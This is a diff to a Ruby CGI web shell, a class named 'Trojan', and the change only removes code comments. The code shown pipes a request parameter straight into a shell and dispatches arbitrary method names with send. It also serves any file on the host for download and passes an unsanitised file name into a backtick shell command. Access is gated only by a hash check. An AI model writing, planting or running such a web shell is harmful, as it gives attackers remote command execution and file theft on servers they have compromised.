@@ -10,25 +10,16 @@ class Trojan
     attr_accessor :cgi, :cwd, :response, :session
 
     def initialize params
-        # store the session and cgi objects
         @cgi      = params[:cgi]
         @session  = params[:session]
-
-        # emulate cwd persistence
         @cwd      = (@session[:cwd].nil?) ? `pwd`.strip! : @session[:cwd]
-
-        # vivify the response object
         @response = {};
     end
 
     def process_command()
         json = @cgi.params
-
-        # if the specified action was 'shell', pipe the command directly into
-        # the web shell.
         if json['action'].first.eql? 'shell'
             process_shell_command(json['cmd'].first)
-        # otherwise, simply invoke the method directly
         else
             send json['action'].first, json
         end
@@ -64,19 +55,15 @@ class Trojan
     # Payload functions are from here downward
     ##########################################################################
     def payload_file_down json
-        # emulate directory persistence
         Dir.chdir @cwd
         dl_file = json['args[file]'].first
 
-        # if the requested file exists, serve it up to the user
         if File.exist? dl_file
             puts @cgi.header(
                 'Content-Disposition'       => 'attachment; filename=' + File.basename(dl_file),
                 'Content-Transfer-Encoding' => 'binary',
             );
             puts File.read(dl_file)
-
-        # if not, provide a notification
         else
             puts "File does not exist"
         end
@@ -116,8 +103,6 @@ class Trojan
         img_file = json['args[file]'].first
 
         if File.readable? img_file
-            # defer to the shell for mime-type analysis so the trojan has
-            # fewer dependencies
             mime_type = `file --mime-type -b #{img_file}`.strip!
             puts @cgi.header("Content-Type: #{mime_type}")
             puts File.read(img_file)
@@ -146,8 +131,6 @@ if hash.eql? '62be3607c4a9e56be305e8b939580f85c4c1792d'
         :session => session, 
     })
     trojan.process_command
-
-    # save session data
     session.close
 else
     puts cgi.header('Access-Control-Allow-Origin: *')
